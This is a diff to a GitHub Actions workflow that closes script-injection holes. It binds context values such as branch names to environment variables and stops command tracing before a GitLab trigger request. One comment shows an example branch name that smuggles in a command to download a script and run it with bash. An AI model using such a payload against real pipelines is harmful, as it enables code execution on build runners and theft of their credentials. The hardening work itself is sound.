@@ -1188,56 +1251,68 @@ jobs:
        github.ref_name == vars.REMOTE_TRIGGER_RC_BRANCH)
     steps:
       - name: Check prerequisites
+        # Every context value is bound to an environment variable rather than interpolated
+        # into the script below. `${{ }}` is expanded textually before bash parses the
+        # script, so an interpolated value is code, not data — see the comment on the
+        # 'Trigger remote workflow' step.
+        env:
+          REF: ${{ github.ref_name }}
+          RUN_ID: ${{ github.run_id }}
+          GITHUB_SHA_VALUE: ${{ github.sha }}
+          NC_VERSION_FULL: ${{ needs.build-artifact.outputs.NC_VERSION }}
+          ARTIFACTORY_LAST_BUILD_PATH: ${{ needs.upload-to-artifactory.outputs.ARTIFACTORY_LAST_BUILD_PATH }}
+          GITLAB_TOKEN: ${{ secrets.GITLAB_TOKEN }}
+          GITLAB_TRIGGER_URL: ${{ secrets.GITLAB_TRIGGER_URL }}
         run: |
           echo "Checking if all required variables are set..."
           error_count=0
 
           # Check secrets
-          if [ -z "${{ secrets.GITLAB_TOKEN }}" ]; then
+          if [ -z "$GITLAB_TOKEN" ]; then
             echo "::error::GITLAB_TOKEN secret is not set"
             error_count=$((error_count + 1))
           fi
 
-          if [ -z "${{ secrets.GITLAB_TRIGGER_URL }}" ]; then
+          if [ -z "$GITLAB_TRIGGER_URL" ]; then
             echo "::error::GITLAB_TRIGGER_URL secret is not set"
             error_count=$((error_count + 1))
           fi
 
           # Check required outputs from previous jobs
-          if [ -z "${{ needs.build-artifact.outputs.NC_VERSION }}" ]; then
+          if [ -z "$NC_VERSION_FULL" ]; then
             echo "::error::NC_VERSION output from build-artifact job is not set"
             error_count=$((error_count + 1))
           else
-            echo "✓ NC_VERSION: ${{ needs.build-artifact.outputs.NC_VERSION }}"
+            echo "✓ NC_VERSION: $NC_VERSION_FULL"
           fi
 
-          if [ -z "${{ needs.upload-to-artifactory.outputs.ARTIFACTORY_LAST_BUILD_PATH }}" ]; then
+          if [ -z "$ARTIFACTORY_LAST_BUILD_PATH" ]; then
             echo "::error::ARTIFACTORY_LAST_BUILD_PATH output from upload-to-artifactory job is not set"
             error_count=$((error_count + 1))
           else
-            echo "✓ ARTIFACTORY_LAST_BUILD_PATH: ${{ needs.upload-to-artifactory.outputs.ARTIFACTORY_LAST_BUILD_PATH }}"
+            echo "✓ ARTIFACTORY_LAST_BUILD_PATH: $ARTIFACTORY_LAST_BUILD_PATH"
           fi
 
           # Check GitHub context variables
-          if [ -z "${{ github.sha }}" ]; then
+          if [ -z "$GITHUB_SHA_VALUE" ]; then
             echo "::error::github.sha is not set"
             error_count=$((error_count + 1))
           else
-            echo "✓ GITHUB_SHA: ${{ github.sha }}"
+            echo "✓ GITHUB_SHA: $GITHUB_SHA_VALUE"
           fi
 
-          if [ -z "${{ github.run_id }}" ]; then
+          if [ -z "$RUN_ID" ]; then
             echo "::error::github.run_id is not set"
             error_count=$((error_count + 1))
           else
-            echo "✓ BUILD_ID: ${{ github.run_id }}"
+            echo "✓ BUILD_ID: $RUN_ID"
           fi
 
-          if [ -z "${{ github.ref_name }}" ]; then
+          if [ -z "$REF" ]; then
             echo "::error::github.ref_name is not set"
             error_count=$((error_count + 1))
           else
-            echo "✓ BRANCH: ${{ github.ref_name }}"
+            echo "✓ BRANCH: $REF"
           fi
 
           # Abort if any required variable is not set
@@ -1248,8 +1323,26 @@ jobs:
 
           echo "✅ All required variables are set"
       - name: Trigger remote workflow
+        # Context values are bound to environment variables, never interpolated into the
+        # script. GitHub expands `${{ }}` textually before bash parses the script, so an
+        # interpolated value is *code*: a branch named
+        # 'x/dev/$(curl${IFS}-sSL${IFS}http://host/x|bash)' is a legal, pushable ref, and
+        # command substitution happens inside double quotes too. This job runs on a
+        # persistent self-hosted runner with GITLAB_TOKEN in scope, so the blast radius of
+        # one interpolated ref name is code execution on that runner with those creds.
+        # Bound as env, the same branch name is inert text.
+        env:
+          REF: ${{ github.ref_name }}
+          REPO: ${{ github.repository }}
+          RUN_ID: ${{ github.run_id }}
+          GITHUB_SHA_VALUE: ${{ github.sha }}
+          NC_VERSION_FULL: ${{ needs.build-artifact.outputs.NC_VERSION }}
+          ARTIFACTORY_LAST_BUILD_PATH: ${{ needs.upload-to-artifactory.outputs.ARTIFACTORY_LAST_BUILD_PATH }}
+          GITLAB_TOKEN: ${{ secrets.GITLAB_TOKEN }}
+          GITLAB_TRIGGER_URL: ${{ secrets.GITLAB_TRIGGER_URL }}
         run: |
-          # Enable command echo for debugging purposes
+          # Enable command echo for debugging the branch routing below. Turned off again
+          # before the curl, so the request line and its --form values stay out of the log.
           set -x
 
           # Branch to GitLab Trigger Mapping:
@@ -1277,15 +1370,18 @@ jobs:
           # way the upload job's stage-prefix arm does: both jobs now admit the per-major lanes,
           # and without this arm a suffixed stable lane would deploy as BUILD_TYPE=dev. The dev
           # lanes need no arm — ionos-dev and ionos-dev-v<N> both fall through to the default.
-          if [[ "${{ github.ref_name }}" == "ionos-stable" || "${{ github.ref_name }}" == ionos-stable-v[0-9]* ]]; then
+          # The ionos-stable-v[0-9]* glob on the right stays unquoted: quoting it would turn
+          # the pattern match into a literal string comparison and every suffixed stable
+          # lane would silently fall through to BUILD_TYPE=dev.
+          if [[ "$REF" == "ionos-stable" || "$REF" == ionos-stable-v[0-9]* ]]; then
               BUILD_TYPE="stable"
           # Override build type for rc/* branches
-          elif [[ "${{ github.ref_name }}" =~ ^rc/ ]]; then
+          elif [[ "$REF" =~ ^rc/ ]]; then
               BUILD_TYPE="rc"
           # Extract prefix from */dev/* branches (e.g., 'ah/dev/feature' -> 'dev-ah')
-          elif [[ "${{ github.ref_name }}" =~ ^.*/dev/.*$ ]]; then
+          elif [[ "$REF" =~ ^.*/dev/.*$ ]]; then
               # Extract the part before '/dev/'
-              BRANCH_PREFIX=$(echo "${{ github.ref_name }}" | sed 's|/.*||' | sed 's/[^A-Za-z0-9._-]/-/g')
+              BRANCH_PREFIX=$(printf '%s' "$REF" | sed 's|/.*||' | sed 's/[^A-Za-z0-9._-]/-/g')
               BUILD_TYPE="dev-${BRANCH_PREFIX}"
           fi
 
@@ -1293,13 +1389,23 @@ jobs:
           # from the branch name — version.php is authoritative, and the unsuffixed lanes carry
           # no major in their name at all. The two are already proven to agree: prepare-matrix
           # asserts it for every lane whose name does encode a major.
-          NC_VERSION="${{ needs.build-artifact.outputs.NC_VERSION }}"
+          NC_VERSION="$NC_VERSION_FULL"
           NC_MAJOR="${NC_VERSION%%.*}"
           echo "NC_MAJOR: $NC_MAJOR"
 
           # Construct source build URL for traceability
-          SOURCE_BUILD_URL="https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}"
+          SOURCE_BUILD_URL="https://github.com/${REPO}/actions/runs/${RUN_ID}"
           echo "Source Build URL: $SOURCE_BUILD_URL"
+
+          # Branch routing is settled; stop tracing before the request so the curl line and
+          # its --form values are not echoed. GitHub masks registered secrets everywhere
+          # including xtrace, so the token was never printed in clear — what this avoids is
+          # dumping the Artifactory path and the shape of the trigger URL. The payload is
+          # echoed explicitly instead, which is what the trace was actually useful for.
+          set +x
+
+          echo "Trigger payload: BUILD_TYPE=$BUILD_TYPE NC_MAJOR=$NC_MAJOR REF=$REF"
+          echo "                 NC_VERSION=$NC_VERSION_FULL BUILD_ID=$RUN_ID"
 
           # Trigger GitLab pipeline via webhook with retry logic (3 attempts with 30s delay)
           MAX_ATTEMPTS=3
@@ -1316,18 +1422,18 @@ jobs:
               --request POST \
               --fail-with-body \
               -o response.json \
-              --form token=${{ secrets.GITLAB_TOKEN }} \
+              --form "token=$GITLAB_TOKEN" \
               --form ref="main" \
-              --form "variables[GITHUB_SHA]=${{ github.sha }}" \
-              --form "variables[ARTIFACTORY_LAST_BUILD_PATH]=${{ needs.upload-to-artifactory.outputs.ARTIFACTORY_LAST_BUILD_PATH }}" \
-              --form "variables[NC_VERSION]=${{ needs.build-artifact.outputs.NC_VERSION }}" \
+              --form "variables[GITHUB_SHA]=${GITHUB_SHA_VALUE}" \
+              --form "variables[ARTIFACTORY_LAST_BUILD_PATH]=${ARTIFACTORY_LAST_BUILD_PATH}" \
+              --form "variables[NC_VERSION]=${NC_VERSION_FULL}" \
               --form "variables[NC_MAJOR]=${NC_MAJOR}" \
-              --form "variables[BUILD_ID]=${{ github.run_id }}" \
+              --form "variables[BUILD_ID]=${RUN_ID}" \
               --form "variables[BUILD_TYPE]=${BUILD_TYPE}" \
-              --form "variables[GITHUB_REF_NAME]=${{ github.ref_name }}" \
-              --form "variables[GITHUB_REPOSITORY]=${{ github.repository }}" \
+              --form "variables[GITHUB_REF_NAME]=${REF}" \
+              --form "variables[GITHUB_REPOSITORY]=${REPO}" \
               --form "variables[SOURCE_BUILD_URL]=${SOURCE_BUILD_URL}" \
-              "${{ secrets.GITLAB_TRIGGER_URL }}"; then
+              "$GITLAB_TRIGGER_URL"; then
               TRIGGER_SUCCESS=true
               echo "✅ Trigger successful on attempt $ATTEMPT"
               break
@@ -1355,9 +1461,6 @@ jobs:
             exit 1
           fi
 
-          # Disable command echo
-          set +x
-
           # Print and parse json
           # jq . response.json
           echo "json<<END" >> $GITHUB_OUTPUT
@@ -1382,6 +1485,22 @@ jobs:
 
     steps:
       - name: Collect and display pipeline status
+        # REF and TRIGGER_SKIP_REASON in particular carry branch-derived text: the reason
+        # string is built from github.ref_name over in prepare-matrix, so interpolating it
+        # here would re-open the injection this series closes, one job downstream.
+        env:
+          REF: ${{ github.ref_name }}
+          SHA: ${{ github.sha }}
+          EVENT_NAME: ${{ github.event_name }}
+          WORKFLOW_NAME: ${{ github.workflow }}
+          RUN_ID: ${{ github.run_id }}
+          RUN_NUMBER: ${{ github.run_number }}
+          RUN_ATTEMPT: ${{ github.run_attempt }}
+          ACTOR: ${{ github.actor }}
+          TRIGGERING_ACTOR: ${{ github.triggering_actor }}
+          SERVER_URL: ${{ github.server_url }}
+          REPO: ${{ github.repository }}
+          REMOTE_TRIGGER_REASON: ${{ needs.prepare-matrix.outputs.remote_trigger_reason }}
         run: |
           echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
           echo "🔍 Pipeline Run Status Analysis"
@@ -1390,15 +1509,15 @@ jobs:
 
           # Workflow metadata
           echo "### 📋 Workflow Metadata"
-          echo "**Workflow:** ${{ github.workflow }}"
-          echo "**Run ID:** ${{ github.run_id }}"
-          echo "**Run Number:** ${{ github.run_number }}"
-          echo "**Run Attempt:** ${{ github.run_attempt }}"
-          echo "**Event:** ${{ github.event_name }}"
-          echo "**Branch/Ref:** ${{ github.ref_name }}"
-          echo "**Commit SHA:** ${{ github.sha }}"
-          echo "**Actor:** ${{ github.actor }}"
-          echo "**Triggered by:** ${{ github.triggering_actor }}"
+          echo "**Workflow:** ${WORKFLOW_NAME}"
+          echo "**Run ID:** ${RUN_ID}"
+          echo "**Run Number:** ${RUN_NUMBER}"
+          echo "**Run Attempt:** ${RUN_ATTEMPT}"
+          echo "**Event:** ${EVENT_NAME}"
+          echo "**Branch/Ref:** ${REF}"
+          echo "**Commit SHA:** ${SHA}"
+          echo "**Actor:** ${ACTOR}"
+          echo "**Triggered by:** ${TRIGGERING_ACTOR}"
           echo ""
 
           # Job status summary
@@ -1461,7 +1580,7 @@ jobs:
             elif [ "${{ needs.upload-to-artifactory.result }}" != "success" ]; then
               TRIGGER_SKIP_REASON="upload-to-artifactory did not succeed (${{ needs.upload-to-artifactory.result }})"
             else
-              TRIGGER_SKIP_REASON="${{ needs.prepare-matrix.outputs.remote_trigger_reason }}"
+              TRIGGER_SKIP_REASON="$REMOTE_TRIGGER_REASON"
             fi
           fi
 
@@ -1536,15 +1655,15 @@ jobs:
             echo ""
             echo "## 📋 Workflow Metadata"
             echo ""
-            echo "- **Workflow:** ${{ github.workflow }}"
-            echo "- **Run ID:** [\`${{ github.run_id }}\`](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})"
-            echo "- **Run Number:** ${{ github.run_number }}"
-            echo "- **Run Attempt:** ${{ github.run_attempt }}"
-            echo "- **Event:** ${{ github.event_name }}"
-            echo "- **Branch/Ref:** ${{ github.ref_name }}"
-            echo "- **Commit:** [\`${{ github.sha }}\`](${{ github.server_url }}/${{ github.repository }}/commit/${{ github.sha }})"
-            echo "- **Actor:** @${{ github.actor }}"
-            echo "- **Triggered by:** @${{ github.triggering_actor }}"
+            echo "- **Workflow:** ${WORKFLOW_NAME}"
+            echo "- **Run ID:** [\`${RUN_ID}\`](${SERVER_URL}/${REPO}/actions/runs/${RUN_ID})"
+            echo "- **Run Number:** ${RUN_NUMBER}"
+            echo "- **Run Attempt:** ${RUN_ATTEMPT}"
+            echo "- **Event:** ${EVENT_NAME}"
+            echo "- **Branch/Ref:** ${REF}"
+            echo "- **Commit:** [\`${SHA}\`](${SERVER_URL}/${REPO}/commit/${SHA})"
+            echo "- **Actor:** @${ACTOR}"
+            echo "- **Triggered by:** @${TRIGGERING_ACTOR}"
             echo ""
             echo "## 🎯 Job Status Summary"
             echo ""
@@ -1560,7 +1679,7 @@ jobs:
             if [ -n "$TRIGGER_SKIP_REASON" ]; then
               echo "> ⏭️ **No remote QA deployment was triggered:** $TRIGGER_SKIP_REASON"
               echo ">"
-              echo "> Configure at [Settings → Variables → Actions](${{ github.server_url }}/${{ github.repository }}/settings/variables/actions)."
+              echo "> Configure at [Settings → Variables → Actions](${SERVER_URL}/${REPO}/settings/variables/actions)."
               echo ""
             fi
 
@@ -1592,50 +1711,68 @@ jobs:
           } >> $GITHUB_STEP_SUMMARY
 
       - name: Environment and context information
+        # workflow_dispatch inputs are dispatcher-supplied free text, and repository
+        # variables are admin-supplied; both reach bash as data via env, not as script.
+        env:
+          FORCE_REBUILD: ${{ github.event.inputs.force_rebuild || 'N/A' }}
+          CACHE_VERSION_SUFFIX: ${{ github.event.inputs.cache_version_suffix || 'N/A' }}
+          APPS_TO_REBUILD: ${{ github.event.inputs.apps_to_rebuild || 'N/A' }}
+          EFFECTIVE_CACHE_VERSION: ${{ needs.prepare-matrix.outputs.effective_cache_version }}
+          RUNNER_OS_NAME: ${{ runner.os }}
+          RUNNER_ARCH_NAME: ${{ runner.arch }}
+          DISABLE_REMOTE_TRIGGER: ${{ vars.DISABLE_REMOTE_TRIGGER || 'not set' }}
+          ENABLE_REMOTE_TRIGGER_USER_DEV: ${{ vars.ENABLE_REMOTE_TRIGGER_USER_DEV || 'not set' }}
+          REMOTE_TRIGGER_NC_VERSION: ${{ vars.REMOTE_TRIGGER_NC_VERSION || 'not set' }}
+          REMOTE_TRIGGER_RC_BRANCH: ${{ vars.REMOTE_TRIGGER_RC_BRANCH || 'not set' }}
         run: |
           echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
           echo "🌍 Environment & Context Information"
           echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
           echo ""
           echo "### Workflow Inputs (if workflow_dispatch)"
-          echo "Force Rebuild: ${{ github.event.inputs.force_rebuild || 'N/A' }}"
-          echo "Cache Version Suffix: ${{ github.event.inputs.cache_version_suffix || 'N/A' }}"
-          echo "Apps to Rebuild: ${{ github.event.inputs.apps_to_rebuild || 'N/A' }}"
+          echo "Force Rebuild: ${FORCE_REBUILD}"
+          echo "Cache Version Suffix: ${CACHE_VERSION_SUFFIX}"
+          echo "Apps to Rebuild: ${APPS_TO_REBUILD}"
           echo ""
           echo "### Environment Variables"
-          echo "Base CACHE_VERSION: ${{ env.CACHE_VERSION }}"
-          echo "Effective CACHE_VERSION: ${{ needs.prepare-matrix.outputs.effective_cache_version }}"
-          echo "TARGET_PACKAGE_NAME: ${{ env.TARGET_PACKAGE_NAME }}"
-          echo "ARTIFACTORY_REPOSITORY_SNAPSHOT: ${{ env.ARTIFACTORY_REPOSITORY_SNAPSHOT }}"
+          echo "Base CACHE_VERSION: ${CACHE_VERSION}"
+          echo "Effective CACHE_VERSION: ${EFFECTIVE_CACHE_VERSION}"
+          echo "TARGET_PACKAGE_NAME: ${TARGET_PACKAGE_NAME}"
+          echo "ARTIFACTORY_REPOSITORY_SNAPSHOT: ${ARTIFACTORY_REPOSITORY_SNAPSHOT}"
           echo ""
           echo "### Runner Information"
-          echo "OS: ${{ runner.os }}"
-          echo "Architecture: ${{ runner.arch }}"
+          echo "OS: ${RUNNER_OS_NAME}"
+          echo "Architecture: ${RUNNER_ARCH_NAME}"
           echo ""
           echo "### Repository Variables"
-          echo "DISABLE_REMOTE_TRIGGER: ${{ vars.DISABLE_REMOTE_TRIGGER || 'not set' }}"
-          echo "ENABLE_REMOTE_TRIGGER_USER_DEV: ${{ vars.ENABLE_REMOTE_TRIGGER_USER_DEV || 'not set' }}"
-          echo "REMOTE_TRIGGER_NC_VERSION: ${{ vars.REMOTE_TRIGGER_NC_VERSION || 'not set' }}"
-          echo "REMOTE_TRIGGER_RC_BRANCH: ${{ vars.REMOTE_TRIGGER_RC_BRANCH || 'not set' }}"
+          echo "DISABLE_REMOTE_TRIGGER: ${DISABLE_REMOTE_TRIGGER}"
+          echo "ENABLE_REMOTE_TRIGGER_USER_DEV: ${ENABLE_REMOTE_TRIGGER_USER_DEV}"
+          echo "REMOTE_TRIGGER_NC_VERSION: ${REMOTE_TRIGGER_NC_VERSION}"
+          echo "REMOTE_TRIGGER_RC_BRANCH: ${REMOTE_TRIGGER_RC_BRANCH}"
           echo ""
           echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 
       - name: Job outputs analysis
         if: always()
+        env:
+          HAS_APPS_TO_BUILD: ${{ needs.prepare-matrix.outputs.has_apps_to_build || 'N/A' }}
+          HAS_APPS_TO_RESTORE: ${{ needs.prepare-matrix.outputs.has_apps_to_restore || 'N/A' }}
+          NC_VERSION_FULL: ${{ needs.build-artifact.outputs.NC_VERSION || 'N/A' }}
+          ARTIFACTORY_LAST_BUILD_PATH: ${{ needs.upload-to-artifactory.outputs.ARTIFACTORY_LAST_BUILD_PATH || 'N/A' }}
         run: |
           echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
           echo "📤 Job Outputs Analysis"
           echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
           echo ""
           echo "### prepare-matrix outputs:"
-          echo "- has_apps_to_build: ${{ needs.prepare-matrix.outputs.has_apps_to_build || 'N/A' }}"
-          echo "- has_apps_to_restore: ${{ needs.prepare-matrix.outputs.has_apps_to_restore || 'N/A' }}"
+          echo "- has_apps_to_build: ${HAS_APPS_TO_BUILD}"
+          echo "- has_apps_to_restore: ${HAS_APPS_TO_RESTORE}"
           echo ""
           echo "### build-artifact outputs:"
-          echo "- NC_VERSION: ${{ needs.build-artifact.outputs.NC_VERSION || 'N/A' }}"
+          echo "- NC_VERSION: ${NC_VERSION_FULL}"
           echo ""
           echo "### upload-to-artifactory outputs:"
-          echo "- ARTIFACTORY_LAST_BUILD_PATH: ${{ needs.upload-to-artifactory.outputs.ARTIFACTORY_LAST_BUILD_PATH || 'N/A' }}"
+          echo "- ARTIFACTORY_LAST_BUILD_PATH: ${ARTIFACTORY_LAST_BUILD_PATH}"
           echo ""
           echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
           echo ""
@@ -1645,8 +1782,8 @@ jobs:
             echo ""
             echo "## 📤 Key Job Outputs"
             echo ""
-            echo "- **NC_VERSION:** ${{ needs.build-artifact.outputs.NC_VERSION || 'N/A' }}"
-            echo "- **Apps to Build:** ${{ needs.prepare-matrix.outputs.has_apps_to_build || 'N/A' }}"
-            echo "- **Apps to Restore:** ${{ needs.prepare-matrix.outputs.has_apps_to_restore || 'N/A' }}"
-            echo "- **Artifactory Path:** ${{ needs.upload-to-artifactory.outputs.ARTIFACTORY_LAST_BUILD_PATH || 'N/A' }}"
+            echo "- **NC_VERSION:** ${NC_VERSION_FULL}"
+            echo "- **Apps to Build:** ${HAS_APPS_TO_BUILD}"
+            echo "- **Apps to Restore:** ${HAS_APPS_TO_RESTORE}"
+            echo "- **Artifactory Path:** ${ARTIFACTORY_LAST_BUILD_PATH}"
           } >> $GITHUB_STEP_SUMMARY
